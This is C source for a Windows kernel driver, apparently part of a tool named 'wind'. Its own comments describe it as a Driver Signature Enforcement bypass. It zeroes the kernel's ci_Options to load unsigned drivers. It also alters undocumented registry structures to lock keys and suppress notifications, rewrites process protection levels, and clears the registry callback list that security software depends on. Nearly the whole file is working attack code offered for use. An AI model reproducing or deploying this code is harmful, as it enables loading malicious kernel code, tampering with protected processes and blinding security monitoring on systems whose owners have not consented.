#include <ntifs.h>
#include <ntimage.h>
#define _WIND_DRIVER
#include "defs.h"
#include "wind.h"
#include "regint.h"

static wind_config_t cfg = {(void*)(-(LONG)sizeof(cfg))};
static KMUTEX ioctl_mutex;

// What follows is the meat of the whole DSE bypass.
//
// We temporarily flip the ci_Options to not validate, load driver, flip
// ci_options back.
//
static void ci_restore()
{
	DBG("current ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
	cfg.ci_opt[0] = cfg.ci_guess;
	DBG("now restored ci_Options=%08x\n", *((ULONG*)cfg.ci_opt));
}

static NTSTATUS driver_sideload(PUNICODE_STRING svc)
{
	NTSTATUS status;

	// Clear ci_Options. Daaaaanger zone.
	cfg.ci_opt[0] = 0;

	// Now go fetch.
	status = ZwLoadDriver(svc);

	// Restore ci_Options.
	ci_restore();

	return status;
}

// The rest is just boring driver boilerplate...
static NTSTATUS NTAPI dev_open(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	irp->IoStatus.Status = STATUS_SUCCESS;
	irp->IoStatus.Information = 0;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

static int notify_unlock(int lock, CM_KEY_BODY *tkb, CM_KEY_BODY *kb)
{
	int ret = 0;
	CM_NOTIFY_BLOCK *nb;
	DBG("unlock %d %p %p\n",lock,tkb,kb);

	if (!tkb)
		return 0;
	if (tkb->KeyControlBlock != kb->KeyControlBlock)
		return 0;
	nb = tkb->NotifyBlock;
	while (nb) {
		union {
			struct {
			ULONG low:8;
			ULONG high:8;
			ULONG rest:14;
			};
			ULONG n:30;
		} f;
		if (nb->KeyControlBlock != kb->KeyControlBlock)
			goto skipentry;

		f.n = nb->Filter;
		DBG("process NB @ %p Filter=%x high=%x low=%x\n",
				nb, nb->Filter, f.high, f.low);
		if (!lock && f.low && !f.high) {
			f.high = f.low;
			f.low = 0;
			DBG("unlock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
		if (lock && f.high && !f.low) {
			f.low = f.high;
			f.high = 0;
			DBG("re-lock: changing filter from %x to %x", nb->Filter, f.n);
			nb->Filter = f.n;
			ret++;
		}
skipentry:
		if (!nb->HiveList.Flink)
			break;
		nb = CONTAINING_RECORD(nb->HiveList.Flink,
				CM_NOTIFY_BLOCK, HiveList);
	}
	return ret;
}

// Stop/reenable notifications on registry key.
static NTSTATUS reg_set_notify(PUNICODE_STRING name, int lock)
{
#define KLOCK_FLAGS (CM_KCB_NO_DELAY_CLOSE|CM_KCB_READ_ONLY_KEY)
#define KUNLOCK_MARKER (1<<15)
#define NSPAM 6
	HANDLE 		harr[NSPAM];
	CM_KEY_BODY 	*kbs[NSPAM], *kb;
	NTSTATUS 	st;
	CM_KEY_CONTROL_BLOCK *cb;
	LIST_ENTRY 	*kl;
	void 		**scan;
	int 		i;
	struct {
		LIST_ENTRY 	KeyBodyListHead;
		CM_KEY_BODY  	*KeyBodyArray[4];
	} *cbptr = NULL;

	// Spam handles to ensure we'll appear in cbptr->KeyBodyListHead.
	for (i = 0; i < NSPAM; i++) {
		OBJECT_ATTRIBUTES attr = {
			.Length = sizeof(attr),
			.Attributes = OBJ_KERNEL_HANDLE|OBJ_CASE_INSENSITIVE,
			.ObjectName = name
		};
		st = ZwOpenKey(&harr[i], KEY_READ, &attr);
		if (!NT_SUCCESS(st))
			goto out_unspam_zwclose;
	}
	for (i = 0; i < NSPAM; i++) {
		st = ObReferenceObjectByHandle(harr[i], KEY_WRITE,
				*CmKeyObjectType, 0, (void*)&kbs[i], NULL);
		if (!NT_SUCCESS(st))
			goto out_unspam_deref;
	}

	kb = kbs[NSPAM-1];
	cb = kb->KeyControlBlock;
	st = STATUS_KEY_DELETED;
	if (!cb || cb->Delete)
		goto out_unspam;

	scan = (void*)cb;
	st = STATUS_INTERNAL_ERROR;
	DBG("kb=%p cb=%p, scanning...\n", kb, cb);
	// Find ourselves in the CM_KEY_CONTROL_BLOCK structure.
	for (i = 0; i < 512; i++) {
		DBG("scan near %p = %p %p\n", &scan[i], scan[i], &kb->KeyBodyList)
		if (scan[i] == &kb->KeyBodyList) {
			cbptr = (void*)(scan+i-1);
			break;
		}
	}
	if (!cbptr) {
		DBG("cbptr not found\n");
		goto out_unspam;
	}

	DBG("cbptr @ %p, offset %p\n", cbptr, ((ULONG_PTR)(((void*)cbptr)-((void*)cb))));

	// Now process array area.
	for (i = 0; i < 4; i++)
		if (notify_unlock(lock, cbptr->KeyBodyArray[i], kb))
			st = STATUS_SUCCESS;

	// And list area too.
	kl = cbptr->KeyBodyListHead.Flink;
	DBG("kl=%p\n");
	while (kl && (kl != &cbptr->KeyBodyListHead)) {
		CM_KEY_BODY *tkb = CONTAINING_RECORD(kl, CM_KEY_BODY, KeyBodyList);
		if (notify_unlock(lock, tkb, kb))
			st = STATUS_SUCCESS;
		kl = kl->Flink;
	}

out_unspam:;
	i = NSPAM;
out_unspam_deref:
	for (int j = 0; j < i; j++)
		ObDereferenceObject(kbs[j]);
	i = NSPAM;
out_unspam_zwclose:
	for (int j = 0; j < i; j++)
		ZwClose(harr[j]);
	return st;
}

// Apply/remove hard lock.
static NTSTATUS reg_set_lock(PUNICODE_STRING name, int lock)
{
	OBJECT_ATTRIBUTES attr = {
		.Length = sizeof(attr),
		.Attributes = OBJ_KERNEL_HANDLE|OBJ_CASE_INSENSITIVE,
		.ObjectName = name
	};
	HANDLE h;
	NTSTATUS st;
	CM_KEY_CONTROL_BLOCK *cb;
	CM_KEY_BODY *kb;

	st = ZwOpenKey(&h, KEY_READ, &attr);
	if (!NT_SUCCESS(st))
		return st;
	st = ObReferenceObjectByHandle(h, KEY_WRITE,
			*CmKeyObjectType, 0, (void*)&kb, NULL);

	if (!NT_SUCCESS(st)) {
		ZwClose(h);
		return st;
	}
	cb = kb->KeyControlBlock;
	st = STATUS_KEY_DELETED;
	if (!cb || cb->Delete)
		goto out;

	DBG("lock=%d, kb=%p, cb=%p, t=%x refc=%u flags=%02x nb=%p\n",
	lock, kb, cb, kb->Type, cb->RefCount, cb->ExtFlags, kb->NotifyBlock);

	st = STATUS_SUCCESS;
	if (lock) {
		cb->ExtFlags |= KLOCK_FLAGS;
	} else {
		cb->ExtFlags &= ~KLOCK_FLAGS;
	}
out:;
	ObDereferenceObject(kb);
	ZwClose(h);
	return st;
}

static NTSTATUS regs_do(NTSTATUS (*fn)(PUNICODE_STRING,int), PUNICODE_STRING names, int lock)
{
	WCHAR *p = names->Buffer;
	NTSTATUS status = STATUS_SUCCESS;

	if (!p)
		return status;

	while (*p) {
		WCHAR *next;
		UNICODE_STRING split;
		NTSTATUS item_status;
	
		next = wcschr(p, L';');
		if (next)
			*next = 0;

		RtlInitUnicodeString(&split, p);
		item_status = fn(&split, lock);
		if (NT_SUCCESS(status) && !NT_SUCCESS(item_status))
			status = item_status;
		if (!next)
			break;
		p = next+1;
	}
	return status;
}

static NTSTATUS change_prot(wind_prot_t *req)
{
	int getonly;
	void *proc;
	NTSTATUS status;
	if ((getonly = (req->pid < 0)))
		req->pid = -req->pid;
	status = PsLookupProcessByProcessId((HANDLE)(req->pid), (PEPROCESS*)&proc);
	if (!NT_SUCCESS(status))
		return status;
	if (cfg.protbit < 0) {
		WIND_PS_PROTECTION save, *prot = proc + cfg.protofs - 2;
		memcpy(&save, prot, sizeof(save));
		if (!getonly)
			memcpy(prot, &req->prot, sizeof(req->prot));
		memcpy(&req->prot, &save, sizeof(save));
	} else {
		ULONG prev, *prot = proc + cfg.protofs;
		prev = *prot;
		if (!getonly)
			*prot = (prev & (~(1<<cfg.protbit)))
				| ((!!req->prot.Level) << cfg.protbit);
		memset(&req->prot, 0, sizeof(req->prot));
		req->prot.Level = (prev>>cfg.protbit)&1;
	}
	ObDereferenceObject(proc);
	return status;
}

static NTSTATUS regcb_set(int enable)
{
	static LIST_ENTRY saved_list;
	static int cleared = 0;
	if (!cfg.cblist)
		return STATUS_NOT_SUPPORTED;
	if (cleared ^ enable)
		return STATUS_DEVICE_BUSY;
	if (!enable) {
		saved_list = *cfg.cblist;
		InitializeListHead(cfg.cblist);
		cleared = 1;
	} else {
		*cfg.cblist = saved_list;
		cleared = 0;
	}
	return STATUS_SUCCESS;
}

static NTSTATUS NTAPI dev_control(IN PDEVICE_OBJECT dev, IN PIRP irp)
{
	PIO_STACK_LOCATION io_stack;
	ULONG code;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	UNICODE_STRING us;
	void *buf;
	int len,onoff;

	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);

	io_stack = IoGetCurrentIrpStackLocation(irp);
	if (!io_stack)
		goto out;

	buf = irp->AssociatedIrp.SystemBuffer;
	len = io_stack->Parameters.DeviceIoControl.InputBufferLength;
	code = io_stack->Parameters.DeviceIoControl.IoControlCode;

	irp->IoStatus.Information = 0;

	if (!SeSinglePrivilegeCheck(LUID_SeLoadDriverPrivilege, irp->RequestorMode)) {
		status = STATUS_PRIVILEGE_NOT_HELD;
		goto out;
	}

	status = STATUS_INVALID_BUFFER_SIZE;
	DBG("code=%08x\n",(unsigned)code);

	// codes 0x90x and 0x81x need buffer.
	if ((code & ((0x110)<<2)) && (!buf))
		goto out;

	// 0x10 marks string argument.
	if (code & (0x10 << 2)) {
		// must be at least 2 long, must be even, must terminate with 0
		if ((len < 2) || (len&1) || (*((WCHAR*)(buf+len-2))!=0))
			goto out;

		us.Buffer = (void*)buf;
		us.Length = len-2;
		us.MaximumLength = len;
	}

	onoff = (code>>2)&1;
switch (code) {
	case WIND_IOCTL_INSMOD:
		status = driver_sideload(&us);
		break;
	case WIND_IOCTL_REGLOCKON:
	case WIND_IOCTL_REGLOCKOFF:
		status = regs_do(reg_set_lock, &us, onoff);
		break;
	case WIND_IOCTL_REGNON:
	case WIND_IOCTL_REGNOFF:
		status = regs_do(reg_set_notify, &us, onoff);
		break;
	case WIND_IOCTL_PROT:
		if (len != sizeof(wind_prot_t))
			goto out;
		status = change_prot(buf);
		irp->IoStatus.Information = len;
		break;
	case WIND_IOCTL_REGCBON:
	case WIND_IOCTL_REGCBOFF:
		status = regcb_set(onoff);
		break;
}
out:;
	KeReleaseMutex(&ioctl_mutex, 0);
	irp->IoStatus.Status = status;
	IoCompleteRequest(irp, IO_NO_INCREMENT);
	return status;
}

static VOID NTAPI dev_unload(IN PDRIVER_OBJECT self)
{
	DBG("unloading!\n");
	regcb_set(0);
	IoDeleteDevice(self->DeviceObject);
}

NTSTATUS NTAPI ENTRY(driver_entry)(IN PDRIVER_OBJECT self, IN PUNICODE_STRING reg)
{
	PDEVICE_OBJECT dev;
	NTSTATUS status;
	UNICODE_STRING regs[4]={{0}};
	RTL_QUERY_REGISTRY_TABLE tab[] = {{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK
			|RTL_QUERY_REGISTRY_REQUIRED
#ifdef NDEBUG
			|RTL_QUERY_REGISTRY_DELETE
#endif
			,
		.Name = L"cfg",
		.EntryContext = &cfg,
		.DefaultType = (REG_BINARY<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT)
			|REG_NONE
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"RD",
		.EntryContext = regs,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"RE",
		.EntryContext = regs+1,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"ND",
		.EntryContext = regs+2,
	},{
		.Flags = RTL_QUERY_REGISTRY_DIRECT
			|RTL_QUERY_REGISTRY_TYPECHECK,
		.DefaultType = (REG_SZ<<RTL_QUERY_REGISTRY_TYPECHECK_SHIFT),
		.Name = L"NE",
		.EntryContext = regs+3,
	},
	{}};

	status = RtlQueryRegistryValues(0, reg->Buffer, tab, NULL, NULL);
	if (!NT_SUCCESS(status)) {
		DBG("registry read failed=%x\n",(unsigned)status);
		return status;
	}
	DBG("initializing driver with:\n"
		" .ci_opt = %p\n"
		" .ci_orig = %p\n"
		" .ci_guess = %02x\n"
		" .protofs = %x\n"
		" .protbit = %d\n", cfg.ci_opt, cfg.ci_orig, cfg.ci_guess,
		cfg.protofs, cfg.protbit);

	self->DriverUnload = dev_unload;
	self->MajorFunction[IRP_MJ_CREATE] = dev_open;
	self->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dev_control;

	status = IoCreateDevice(self, 0, &RTL_STRING(L"\\Device\\" WIND_DEVNAME),
			FILE_DEVICE_UNKNOWN, 0, 0, &dev);

	if (!NT_SUCCESS(status)) {
		DBG("failed to create device=%08x\n",(unsigned)status);
		return status;
	}

	if (cfg.ci_orig)
		cfg.ci_guess = *cfg.ci_orig;
	ci_restore();

	dev->Flags |= METHOD_BUFFERED;
	dev->Flags &= ~DO_DEVICE_INITIALIZING;

	KeInitializeMutex(&ioctl_mutex, 0);
	KeWaitForMutexObject(&ioctl_mutex, UserRequest, KernelMode, FALSE, NULL);
	if (cfg.bootreg) {
		regs_do(reg_set_lock, regs, 0);
		regs_do(reg_set_lock, regs+1, 1);
		regs_do(reg_set_notify, regs+2, 0);
		regs_do(reg_set_notify, regs+3, 1);
	}
	KeReleaseMutex(&ioctl_mutex, 0);

	DBG("loaded driver\n");
	return status;
}
